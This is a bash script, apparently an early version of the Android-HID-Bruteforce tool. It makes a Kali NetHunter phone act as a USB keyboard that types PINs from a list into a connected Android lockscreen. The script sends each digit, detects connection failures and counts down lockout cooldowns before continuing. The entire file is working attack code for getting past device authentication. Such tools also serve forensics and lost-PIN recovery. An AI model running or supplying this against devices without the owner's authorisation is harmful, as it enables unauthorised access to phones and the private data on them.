#!/bin/bash
# Android-HID-Bruteforce
# 
# Unlock an Android phone (or device) by bruteforcing the lockscreen PIN.
# 
# Turn your Kali Nethunter phone into a bruteforce PIN cracker for Android devices!
# This uses the USB OTG cable to emulate a keyboard, automatically try PINs, and wait after trying too many wrong guesses.
#
# https://github.com/urbanadventurer/Android-HID-Bruteforce


# Load Configuration
source config


VERSION=0.1
DRY_RUN=1
VERBOSE=0

# Operating System Environment
KEYBOARD_DEVICE=/dev/hidg0
HID_KEYBOARD=/system/xbin/hid-keyboard
USB_DEVICES=/usr/bin/usb-devices

#RET=0

LIGHT_GREEN="\033[92m"
LIGHT_YELLOW="\033[93m"
LIGHT_RED="\033[91m"
LIGHT_BLUE="\033[94m"
DEFAULT="\033[39m"
CLEAR_LINE="\033[1K"
MOVE_CURSOR_LEFT="\033[80D"

function usage() {
  echo -e "Android-HID-Bruteforce is used to crack PINs on Android phones

  Find more information at: https://github.com/urbanadventurer/Android-HID-Bruteforce

Commands:
  crack\t\t\tBegin cracking PINs
  resume\t\tResume from a chosen PIN
  rewind\t\tCrack PINs in reverse from a chosen PIN
  diag\t\t\tDisplay diagnostic information

Flags:
  --from PIN\t\tResume from this PIN
  --mask REGEX\t\tUse a mask for known digits in the PIN
  --type PIN|PATTERN\tSelect PIN or Pattern cracking
  --length NUM\t\tCrack PINs of NUM length

Usage:
  android-pin-bruteforce <command> [flags]

"

}

function discover_device() {
 if [ $DRY_RUN -eq 0 ]; then
    # accepts any USB device manufacturer except Linux
    devices=$(usb-devices | egrep -C 5 "Manufacturer=[^L][^i][^n][^u][^x]" \
 | egrep "Vendor|Manufacturer|Product|SerialNumber" | cut -c 5- )
 else
    devices="Manufacturer: Dry-run Dummy Android Device"
 fi

 if [ -n "$devices" ]; then
   log_pass "Device identified: $devices"
 fi
}

# Show configuration
function show_configuration() {
  log_info "PIN list: $PIN_LIST"
  log_info "Delay between keystrokes: $DELAY_BETWEEN_KEYS"
  log_info "HID Keyboard device: $KEYBOARD_DEVICE"
  log_info "Log file: $LOG"
}

function abort() {
  if [ $DRY_RUN -eq 0 ]; then
    exit 1
  else
    # continue
    echo Dry Run Continues
  fi
}

function send_enter() {
  send_key enter
}

function send_esc() {
  send_key esc
}

function send_key(){

  if [ $DRY_RUN -eq 0 ]; then
    echo $1 | $HID_KEYBOARD $KEYBOARD_DEVICE keyboard 2>/dev/null
    RET=$?
    sleep $DELAY_BETWEEN_KEYS
  else
    RET=0 # as if it succeeded
    sleep $DELAY_BETWEEN_KEYS
  fi
}

function repeat(){
  printf "%0.s$1" $(eval echo {1..$2})
}

function log_info(){
  echo -e "[${LIGHT_BLUE}INFO${DEFAULT}] $1" | tee -a $LOG
}

function log_pass(){
  echo -e "[${LIGHT_GREEN}PASS${DEFAULT}] $1" | tee -a $LOG
}

function log_fail(){
  echo -e "[${LIGHT_RED}FAIL${DEFAULT}] $1" | tee -a $LOG
}


function monitor_phone_connection(){
  # check connection to phone
  # RET is set by the send_key/send_enter function
  fail_counter=0
  while [ $RET != 0 ]; do
    log_fail "HID USB device not ready. $HID_KEYBOARD returned $RET." 
    sleep 2
    send_enter
    ((fail_counter++))

    if [[ $fail_counter -gt $EXIT_AFTER_FAIL_COUNT ]]; then
      log_fail "Exiting after $EXIT_AFTER_FAIL_COUNT successive failures."
      abort
    fi
  done
}


function check_environment(){
  if [ -e $KEYBOARD_DEVICE ]; then
    log_pass "HID device ($KEYBOARD_DEVICE) found"
  else
    log_fail "HID device ($KEYBOARD_DEVICE) not found"
    abort
  fi

  if [ -f $HID_KEYBOARD ]; then
    log_pass "hid-keyboard executable ($HID_KEYBOARD) found" 
  else
    log_fail "hid-keyboard executable ($HID_KEYBOARD) not found"
    abort  
  fi

  if [ -f $USB_DEVICES ]; then
    log_pass "usb-devices executable ($USB_DEVICES) found" 
  else
    log_fail "usb-devices executable ($USB_DEVICES) not found"
    abort  
  fi
}




echo "Android PIN brute-force :: version $VERSION" | tee -a $LOG


if [[ $VERBOSE > 0 ]]; then
  log_info "Current Configuration"
  show_configuration
fi

if [ ! -z "$1" ]; then
  RESUME_FROM_PIN=$1
  log_info "Resuming from PIN $RESUME_FROM_PIN"
fi

# Check Environment
log_info "Checking environment"
check_environment

# Find Android phone over USB cable
log_info "Identifying Android Phone"
discover_device

count=0
for pin in `cat "$PIN_LIST" | grep -A 99999 "$RESUME_FROM_PIN"`
do
  ((count++))

  # hit escape and enter before every PIN attempted
  send_esc
  send_enter

  # if we got an error from sending the key, check the phone connection
  if [ $RET -gt 0 ]; then
    monitor_phone_connection
  fi

  echo "[SEND] $pin. Attempt $count at $(date +"%b%d %r")" | tee -a "$LOG"
  for i in `echo "$pin" | grep -o .`; do
    send_key $i
  done 
  send_enter

  # COOLDOWN_TIME is optional
  if [[ $COOLDOWN_TIME > 0 && $COOLDOWN_AFTER_N_ATTEMPTS > 0 ]]; then
   
    # if we are after N attempts
    if [ $((count % $COOLDOWN_AFTER_N_ATTEMPTS)) = 0 ]; then
      # countdown COOLDOWN_TIME seconds
      for (( countdown=$COOLDOWN_TIME; countdown > 0; countdown-- ))
      do
        echo -ne "$CLEAR_LINE$MOVE_CURSOR_LEFT" # clear line and move cursor left
        echo -ne "[${LIGHT_YELLOW}WAIT${DEFAULT}] "
        echo -ne "$countdown"
        if [ $(($countdown%5)) = 0 ]; then
          send_enter
        fi
        sleep 1
      done
      echo -ne "$CLEAR_LINE$MOVE_CURSOR_LEFT" 
    fi
  fi

done

#  pin=$(printf "%04s" $pin)



